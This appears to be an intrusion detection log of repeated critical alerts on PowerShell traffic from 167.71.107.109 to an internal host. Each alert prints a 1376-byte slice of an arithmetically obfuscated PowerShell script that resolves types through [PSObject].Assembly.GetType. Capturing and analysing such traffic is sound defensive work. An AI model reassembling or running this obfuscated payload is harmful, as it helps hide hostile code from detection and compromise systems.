6-(43969900/(10700326/(4655-2842)))),(1928-1844),(8554-(33866928/(36529536/(18522-(73805580/7830))))),(234080/2090),(-6996+7097),(275665/4241),(7852-7753),(-2398+(13606153/(23321720/(-5919+(62060915/6085))))),(496819/(13548-(-1546+(17082-(12294-5387))))),(-6863+6971),(293001/(10990-8089)),(-5804+(54960466/9287)),(917911/9463),(1138192/(7812+(10888000/5444))),(278499/(9132-(-2307+8930))),(1404-(-1066+2356)),(683330/5942)) -join ''))::Add((-join (@((374532/3174),(-3837+(25371752/6433)),(1793-(5518
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.028022
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
162408/(8674-(49794102/7047))),(3956-3847),(2229-(2987712/(3747276/2669))),(-1561+(-1953+(8028-(10055-5651)))),(7133-7017),(4702-4656),(628745/(14228-4555)),(460512/(36762240/9340)),(-5243+(-652+6011)),(4192-(-29+(-3707+7817))),(-2864+(8270886/(-2065+4847))),(-4763+4860),(1124156/9691),(9409-9304),(-3634+3745),(-1551+(-7435+9096)),(-5612+(13463-7805)),(223608/2662),(375947/(26347360/8480)),(9379-(551+(72743736/8346))),(-4019+4120),(229710/3534),(-9794+(41847390/(17465670/4129))),(191466/(9556-(1
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.029761
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
4770/1661)),(1999-(18308108/(19539-(46823569/4733)))),(3345-(12695-(4884+(34190884/7462)))),(3991-(36019668/9293)),(-8443+8489),(-3103+(3906036/(-4915+(49011321/7981)))),(5460-(13451-8102)),(441738/(9548-5086)),(-7287+7394),(1299-(6744740/(8943-(33073679/(47928383/(-1536+6337)))))),(853180/(10366-3011)))))); [PSObject].Assembly.GetType(([char[]]@((365532/(-5037+(69863400/(-576+7976)))),(4983-(8935-4073)),(155595/(9519-8166)),(4795-(-3650+8329)),(930513/(11160-1947)),(-5544+(17298180/3060)),(-722
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.031500
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
2)),(447066/(31224492/7124)),(-8647+8751),(7865-(63924465/(67312338/8166))),(-4913+5018),(-8777+(14845-(1739+(12315-8103)))),(139602/(-2549+(13453680/(9997-6517)))),(-9875+(19010-9037)),(1339-1242),(1086624/9702),(-1650+(11260-9507))) -join ''), [type]([system.String]::new(@((-2952+(30786546/10038)),(3922-(33562830/(80485450/9115))),(1157130/(16727-6665)),(1143528/(13919496/1412)),(7831-7730),(-3783+(-660+(14366-(82545554/(28975895/3445))))),(-2915+2961),(408028/(-406+(13882-8560))),(-8345+(8334
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.033094
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
098+(3345+2869)),(-8246+(16514-(33272403/(-1975+(8917542/1473))))),(7985-(54727063/6953)),(4872-(29360204/6172))) -join ''))::Add((-join (@((601020/5565),(132702/1301),(1001640/(28788803/(-5852+(23987279/2579)))),(956911/(12255-3476)),(-8445+8556),(6601-(14653-8150)),(-1297+(-4470+(15359-(62731779/(4115+2496))))),(-5568+(57074369/10043)),(-9333+9443),(8730-8617),(-1199+1311))| trjaismnckwl { [char]$_ })), [type]([char[]]@((7397-(21881408/(7371-4385))),(-6168+6278),(-8977+9094),(-9776+9885)) -joi
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.034716
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
83804/7619),(4919-4808),(4239-(11276-7151)),(623645/5423)) -join ''))::Add(([system.String]::new(@((253552/2392),(5965-5862),(361035/(5799-2604)),(1295-(3961266/3326)),(6428-6316),(989121/8911)))), [type](-join (@((435003/(11712-(169+6302))),(1377-(-347+1603)),(1085830/(1380+8062)),(1149096/9906),(906778/8978),(8715-(61937382/(9537-(-2611+(2100+2851))))),(6035-(-3928+9917)),(4170-(10823714/(-2987+(26617500/4732)))),(3204-(-5007+(29095200/(467+(21868750/6998))))),(-8170+(12566-(-3044+7330))),(632
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.037156
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
2190/(7356+(9342-7888))),(-8842+(4521+4420)),(926069/9169),(3010-2902),(-2952+3053),(6072-(4591+(9864-(37650207/4431)))),(-1500+(-1968+(768+(4159-1362)))),(947836/8171),(190587/1717),(-5729+(39282489/(4596+2127))),(1065590/(83449596/(2395+(41874074/6334))))) -join ''))::Add((-join (@((2491-(18716320/(55276056/7029))),(9452-9352),(271116/2658),(996555/9491),(-2116+(16153884/7218)),(978574/(53406920/6440)),(-5826+5929),(3583-(10756-7279)),(7049-6936),(628422/6222),(-3021+(-5678+8807)))| uvrfwpx { 
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.039771
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
50/6082)),(159003/1359),(1369-(11196808/(15704-6768))),(5744-5633),(-6817+(57056388/(57789570/(55713130/7942)))),(-6835+6932),(163676/(5093-(-1506+5188))),(2621-(4234-1718)),(2374-2263),(-2361+(10353490/4190)),(2265-(11752-(1750+(38323492/(-90+(-1141+(12329-6174))))))),(2395-2311),(-5163+(-2245+(-33+7562))),(8812-8700),(5524-5423),(-2246+2311),(8706-(1667+(28974500/(13301550/(4481-(-6180+7475)))))),(7037-6938),(-8319+8420),(-6728+6836),(4849-(378+4370)),(-8358+(67284624/7942)),(684626/7058),(807
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.042406
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
),(-7595+7704))| esgojmkuwnh { [char]$_ }))); [PSObject].Assembly.GetType(([system.String]::new(@((182102/(1067+(10242176/9088))),(1525-(-3153+(14509-(11793120/(12094110/10206))))),(5719-5604),(-8715+8831),(5446-(1768+(-3654+7231))),(901103/8267),(-7379+7425),(-2120+2197),(7688-(4259+3332)),(958760/8716),(569002/(9354-(-817+4305))),(-5161+(25125072/4773)),(823352/(15918-7766)),(950044/(72979068/8373)),(-6213+6314),(876590/7969),(248936/2146),(-2075+(8918805/4205)),(-5204+5269),(9716-9599),(7599-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.044507
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
251/(18635599/(9393-6980))))),(-8997+9095),(-5812+5914),(-2303+(20956824/8703)),(8950-(2095+6754)),(750276/6947),(5052-4953)) -join ''), [type]([system.String]::new(@((659103/7941),(9642-9521),(-7039+7154),(-4746+(10092-5230)),(-6524+6625),(443303/4067),(5251-5205),(3801-3723),(601758/(9510-3552)),(-1683+(3384-(7965-(-817+(12964-5767))))),(-8528+(11412-(9243366/(-5744+9001)))),(3382-3299),(8632-(-1409+(376+(11523-1969)))),(8048-(2929+5020)),(423292/(10678-6722)),(9829-9728),(-4627+4743),(1572-14
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.046026
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
0)),(4264-(13521-9362)),(505272/(116+(6393-(-7608+9565)))),(6635-6525),(-9268+9314),(8045-7961),(1096018/(1211+7847)),(4229-4117),(394102/(10381-6479)),(9698-9633),(180081/1819),(161667/(-6342+7975)),(409757/4057),(-8968+9076),(8644-8543),(768360/6740),(-1951+(-1518+3566)),(302180/(7067365/(-4868+7581))),(-9256+9367),(6041-(585+(-1184+(65997438/(38935050/3850))))),(-5220+5335))| mhftynewugrkxj { [char]$_ })))::Add((-join (@((6245-(55226232/(4051+4967))),(9421-9318),(2045-(9112744/4678)),(978168/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.048242
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
378),(1132089/(11355-(-5263+(4277+2142)))),(-8726+8836),(141542/(6323235/2055)),(752312/9064),(700350/(9016-(7888-4962))),(8470-8362),(5025-(12503-7558)),(828780/(13544-(49564600/7900))),(-6348+(56322480/(17356-(72542400/(62605200/(12248-4795)))))),(7359-(58407552/(6876+(9529-(66386019/7959))))),(-3951+(5454-1392)),(363627/(4492079/(7151-(49297248/8316)))),(163836/1476),(-5725+5833),(192855/1677))| zwompvh { [char]$_ }))); [PSObject].Assembly.GetType(([char[]]@((-6226+6309),(6456-6335),(378810/(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.051411
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(-1267+1375),(3415-(17292452/5218)),(738492/6478),(910927/9391),(590556/5091),(6752-6641),(373692/3278),(491050/(10970-6700))) -join ''))::Add((-join (@((385550/(1637+1868)),(3904-3792),(922110/8782),(8100-(3567+(14222288/3209))),(1930-(-8346+10163)),(820664/(45649435/(15229-9444))),(465406/4798),(2948-(5162-2317)),(9152-9036),(-6817+(7838961/(-2838+3969))))| vrkmcnh { [char]$_ })), [type](-join (@((-8806+8889),(-4151+(-1531+(59271842/10214))),(3058-2943),(10137-10021),(668216/6616),(7295-7186),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.053422
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-1116),(6573-6457),(3752-(-1216+4857)),(1959-1850),(157819/1627),(-4739+(9840-(10353845/(-6907+8984)))),(198660/1892),(182928/(7955-(1077+5230))),(194040/(7657524/(8997-4656))),(-5505+(7463-1912)),(-7420+(15400-(61541424/(43+(79145461/(68301379/6689)))))),(567974/4694),(646576/5773),(2612-2511),(368485/5669),(4269-4170),(776754/(-2038+(16002-(7451-(7084-(16827426/2926)))))),(944451/(-775+10126)),(323136/(776+2216)),(4038-3937),(-1083+1197),(382762/3946),(923360/7960),(-10063+10174),(4103-3989),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.055512
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(-4028+8901)),(868600/(4136+(-3273+7737))),(-3026+(11263-(32048704/(19569109/(1994+(-2539+(14510-(63041006/(25637983/(8262-(-4399+(53793000/5977)))))))))))),(791335/7835),(3492-3382),(313084/(14965955/5545)),(6558-6512),(352495/(-1449+(10053736/1463))),(466128/(11067-7083)),(832532/7177),(-6303+(60310842/(5214+4189))),(374851/3439),(6311-(-3167+9381)),(6936-6820),(6067-5962),(900321/(47717013/5883)),(-5947+6057),(-9325+(16339-(652+6316))),(1673-1589),(367840/(-537+3577)),(166880/1490),(665590/(5
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.058437
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
551-6436),(-5170+5216),(1692-1609),(-4574+(20911275/4473)),(5354-5246),(-2345+2446),(3936-3837),(788684/6799),(9825-(80352764/(10726-2483))),(-4190+(11124-6823)),(-4221+4321),(355217/(-448+(-2887+(10473-3621)))))| elyknfmzv { [char]$_ }))); [PSObject].Assembly.GetType(([system.String]::new(@((492024/(-88+(-975+6991))),(-8102+(82345122/(20108112/(6985-(35381493/7109))))),(10260-(13971-3826)),(2942-2826),(6519-(-439+6857)),(151292/(9467-(5112+(6+2961)))),(178756/3886),(488026/(12080-5742)),(4050-3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.060245
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
),(772695/7359),(-2436+(-2678+(11623-(3988+(-5294+(2098+5613)))))),(-3743+3865),(3245-(5612-(9030490/3634))),(-7862+7968)))), [type](-join (@((-1152+1235),(-3498+3619),(5310-(750+4445)),(5681-(11224605/(5562886/(13494894/(2152+2741))))),(319160/3160),(-10079+10188),(8132-(-180+(27930814/3379))),(-5480+(55174608/(37736928/(-3314+(15824-8712))))),(9095-9016),(1491-(-3391+4836)),(7554-7487),(452991/(-692+(15017-10244))),(5097-(6344-(10691-(56122020/(836+5176))))),(6787-(13631-6956)),(1619-1505),(42
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.062409
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
5-8790)),(173884/1499),(88182/1917),(-5919+(7494-1510)),(309816/(-6666+(6322+2992))),(1138772/(83307062/8486)),(-8268+(3467+(25729056/(2530+(3214396/1187))))),(495078/(12554088/(-2990+5754))),(184591/1903),(6507-(11907-5516)),(924525/8805),(6648-(16020-9483)),(268070/(3633567/1491)),(9304-9258),(7526-(2864+(11380-6802))),(-2362+(-6458+(13981-5040))),(7373-7261),(2055-1954),(5801-5736),(-6970+(4572+(8728-(-178+(1519+(13864-(54893958/6117))))))),(-7800+(22757019/(14808340/(-1475+6615)))),(755783/(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.064721
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(-3296+9771)),(251790/2289),(5085-4982))))); [PSObject].Assembly.GetType(([char[]]@((7500-(27598657/3721)),(-4312+(10018-5585)),(-7728+7843),(670596/(2331+(1707+1743))),(373599/3699),(-6850+6959),(-5176+5222),(4261-4184),(618763/(1800+(354+(8673925/2053)))),(857450/7795),(-4948+5045),(-1777+1880),(4682-4581),(922467/8463),(211999/2099),(1913-(10870-(84803651/9353))),(-4057+4173),(96278/(-7161+(5136+4118))),(-9111+9176),(9321-(71524284/(41217384/(-4326+9630)))),(-4763+4879),(-1321+1432),(347928/3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.066396
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
878/(3388-(10603-(11106-(11346076/(7668-2506)))))),(8843-8761),(756086/7486),(872304/(16526-(15601-(69443835/(13197-4092))))),(-4662+(45548730/9549)),(6470-(40258449/(9157-(-2042+(3674+1204))))),(-2459+(-3970+6528)),(5740-5624),(-3417+3522),(-3353+(821+(12768-10125))),(-8475+8585),(3799-(26683830/(2230+4880))),(-6721+6786),(473225/(40956595/9953)),(2411-2296),(8359-(40340330/(2039+(-2648+(4333+1161))))),(613016/(1765+3859)),(142590/(-3806+5261)),(-6329+(13043-6606)),(697081/(30072420/5220))) -jo
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.068396
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
366-(59488548/(-952+(75803000/(62166790/(15217-7754)))))),(-6207+6306),(2549-(10314500/4210)),(-2478+2579),(-8316+8424),(475710/4710),(4439-(11815-7490)),(636514/6562),(-2551+(7518-4851)),(8709-8598),(8314-(5221+2979)),(8468-(12016-3663))))))::Add(([system.String]::new(@((244125/(-2425+(-4154+8904))),(3482-3371),(-9844+(3930+(8263-2227))),(-9014+(7005+2108)),(4463-(-5150+9495)),(522032/(1649+3012)),(796273/(15014-6805)),(4077-3969),(2705-2588),(352894/(5134-1640))))), [type](-join (@((5733-(-423
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.070138
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
72-(1989+7402))),(5253-(11942-(15558400/(-5430+(-1959+9677))))),(6431-6321),(292238/6353),(731220/(12550-3845)),(323191/2671),(853216/(17583-(6675+(10261510/3119)))),(4634-4533),(106275/1635),(-4124+4223),(573903/5797),(-9743+(2632+7212)),(-4801+4909),(-2628+2729),(652878/(-987+6714)),(316608/3264),(-4769+4885),(713286/(53091612/8262)),(1134984/9956),(7192-(10739-3662))) -join ''))::Add(([system.String]::new(@((5814-5708),(1023192/(10459296/1104)),(3602-3491),(827730/8115),(1226-1116),(3247-3133
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.072512
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-4420),(-7852+(3978+3975)),(408532/(19508340/5205)),(457227/(31426434/(12712-(-685+6455)))),(-8640+8750),(-8181+(74531951/(32311851/(-4378+7975)))),(-1944+(6477-4487)),(246220/3788),(557739/4767),(6402-6286),(-4919+5030),(587837/5393),(-6095+6192),(873596/7531),(1059450/10090),(6597-(14570-8084)),(3511-(23803599/6999)),(270112/5872),(4630-(-168+4714)),(758791/6271),(4968-4856),(-3492+3593),(302770/(39634922/(13462-4953))),(2733-(5459-2825)),(420354/4246),(208868/2068),(-9038+(51729776/5656)),(80
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.075149
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
101665630/10190))),(-4838+4949),(983988/(13110729/(-1747+3186))),(599088/(38812344/5442)),(1058145/(57480885/(4367+2206))),(856016/7643),(4095-(27019410/(2348+(36038303/8159)))))| sbgrzoleuw { [char]$_ }))); [PSObject].Assembly.GetType(([char[]]@((-5928+6011),(933878/(2005+(8369545/(7180-5715)))),(1114350/9690),(8833-8717),(862944/8544),(3626-(5906-2389)),(3794-3748),(-8184+8261),(7661-(76010636/(16487-6438))),(10301-(3327+(14943-8079))),(342410/(11874-(5683+(11265-(14059-(51255180/(18747-(5425+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.077556
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8518)),(-3473+3574),(-9978+(16202-(34141105/5585))))| kmvcfnghleas { [char]$_ })), [type]([char[]]@((4379-4310),(2715-(6815-(20982640/4984))),(-8102+8220),(7821-7716),(475038/(468+(14762709/(30766619/7709)))),(5524-(46692538/(38894634/(9459-(41896800/8464))))),(1070520/(30772584/(27430350/8675))),(550232/5048),(-2625+2726),(1081080/(91881972/9349)),(8931-8815)) -join '')); [PSObject].Assembly.GetType(([char[]]@((9086-(35579856/3952)),(4379-4258),(-3654+(31196013/(-1513+9790))),(8886-(16646-7876)
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.080314
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
/6908),(4971-4874),(9834-(78180960/8040)),(4280-(13204-(4031+(9253998/1846)))),(5835-(-293+6030)),(-2848+(863+(5404-3315))),(618418/(2406+2663)),(-7580+(61148441/7961))))), [type](-join (@((-4895+(3287+1691)),(1045924/(47758100/5525)),(873080/7592),(4792-(37898980/8105)),(7247-(44741106/(-2019+8280))),(-2341+(-7123+9573)),(-7040+(679+(10282-(14095-(2846+7374))))),(-8642+(12956-4231)),(-5743+5844),(999405/(14178-(-1268+5351))),(5075-4958),(4714-4600),(201495/1919),(10064-(81145836/(1071+7086))),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.083115
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
4/(20018866/5327)),(702758/6958),(697709/6401),(1984-1883),(-5828+5938),(246384/2124),(2719-2673),(-4047+(5362048/(-1493+2797))),(788229/6737),(405652/3497),(-6143+6254),(-3123+3232),(-4957+5054),(-5185+5301),(-8072+8177),(152736/(7418-(53979228/8934))),(-7419+7529),(2875-(-7129+9958)),(350532/4173),(-2771+(-1377+(14303-10034))),(4113-4001),(-9865+9966),(-3672+3737),(264528/(12857664/(37591344/(13537-(12532-6807))))),(-2911+3010),(5218-5117),(-8787+(13653-4758)),(5541-(27608000/(10978-5903))),(8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.085823
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
73+(13742860/8156)),(7010-(31751409/4593)),(5346-(11900736/(-3735+(12676-6669)))),(-2432+(9379-6901)),(755334/(23649768/(-7054+9778))),(1030155/9811),(-2253+(-223+(-4691+7277))),(605600/(38310256/6326)),(-1691+(7401-(32037478/5722))),(307496/2584),(411815/3581),(4113-(5676-1636)),(-7265+(9181-1816)),(4576-4475),(9226-(1887+(-2293+(-591+10113)))),(845176/(142+(3468+(-5116+(14237-5445))))),(-9191+(6379+(-53+2970))),(2316-2200),(10289-10168)) -join '')); [PSObject].Assembly.GetType(([char[]]@((-515
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.089581
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
88)),(4045-3944),(-4685+(-1631+6424)),(1000304/(7511+(9107-(-2273+8987)))),(7083-6969),(-1364+1461),(1252-1136),(501276/4516),(-4739+4853),(1232-1117)) -join ''))::Add(([system.String]::new(@((-9971+10079),(789488/(298+7758)),(2202-(15491536/(-1450+(57201270/(4663+(-3138+(8561-3616))))))),(952848/9162),(8187-8084),(988195/8593)))), [type](-join (@((-6140+6223),(758428/(9890-(33517988/(13269-(-5672+9687))))),(8849-(40936258/4687)),(7441-(11310-(6910-(258+2667)))),(-1637+(10492306/6037)),(580970/5
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.092692
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
/(10101-(3451939/(6413-(5547980/(-2473+(-2422+(-1438+7547)))))))),(-9864+9980),(788810/(16238-(57765512/(10629-(5812-(-7754+9791)))))),(3978-(6121-2252)),(5435-(6812-(11536261/8107))),(4567-4490),(9963-(16592-(4663+(10477977/5079)))),(854810/(11583-3812)),(252394/2602),(350612/3404),(609232/6032),(644953/5917),(199374/1974),(5788-(46270022/8149)),(-9609+(88127950/(16609-7547))),(378764/(5055+(28938437/(17957-(49653232/5608))))),(487175/7495),(6762-6645),(290928/(-3987+6495)),(278388/2508),(-7057
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.095158
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)),(7082-(8306-(4691340/(19259001/5501)))),(9459-9358),(399158/(9672-(16191-10181))),(8044-7998),(404789/(16128476/(26452296/(-859+(11410-1929))))),(6957-(68078640/9924)),(416790/(8481-4692)),(823142/(18659-10173)),(-6222+(14414675/2279)),(-5878+(11425869/(10932831/(48720036/8516)))),(1778-1669),(-6550+(14640-7989)),(640310/(-845+(11255-4589))),(-3961+(5629-1552)),(-4981+5027),(563409/7317),(4982-4885),(8157-8047),(770859/7947),(501610/4870),(5470-(9308-3939)),(4327-4218),(-8053+(12573468/1542))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.097360
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-7329),(9292-(74199150/8025)),(505932/(4315+1708)),(1096986/(3478+5588)),(998032/8911),(8099-(17893-9895)),(136825/2105),(3965-(-1752+5618)),(6006-(-422+6329)),(1034341/10241),(8281-(5927+(3719-(6643-5170)))),(5077-(11456-(57769200/8915))),(6771-6657),(3679-(10151-6569)),(2310-(6746-(9754936/2143))),(287934/(-3826+(1363+5057))),(8308-8194),(308545/(1316+(10093-8726))))| nzogilphqbc { [char]$_ })))::Add(([char[]]@((9813-(6279+3426)),(8033-(72441208/(57430044/(3097+(31391360/9856))))),(-8985+9092)
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.099483
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
em.String]::new(@((4945-(18441566/(5691-1898))),(-7614+(6392+(10280-(9937944/1112)))),(-7202+7317),(823948/7103),(863651/8551),(-2543+2652),(68770/1495),(651420/8460),(-1948+(8415175/(673+(2062+1380)))),(-4698+(14168-(14019-(12948-(30196827/(-1750+(-3129+8522))))))),(-9100+9197),(7932-(34674641/(13473-(10381-1337)))),(401879/(32225921/8099)),(6215-6106),(1263-1162),(334070/(19685834/6482)),(1169048/(6467+(31047378/8598))),(370714/8059),(-3889+(1231+2723)),(-7618+(12998-(-2509+(4812+2960)))),(896
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.100976
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-8974+(71365800/(72498216/(-308+9527)))),(-8674+8783),(335018/(40194877/5519)),(7283-7199),(415480/(-4788+(15146-(8157-1794)))),(-10107+10221),(-4535+(32340736/6976)),(-7169+(4352+(-387+(31263771/(3166+6305))))),(-3199+3299),(-7838+7943),(761530/(-2055+(13138-(714+3446)))),(4314-(33018451/7841)),(376372/8182),(8619-8535),(7242-7138),(-7796+(-1507+9417)),(184628/(5670-3842)),(920918/9494),(8325-8225))| merwzj { [char]$_ }))); [PSObject].Assembly.GetType((-join (@((2715-(-138+2770)),(1706-(1743500
==================================================


==================================================
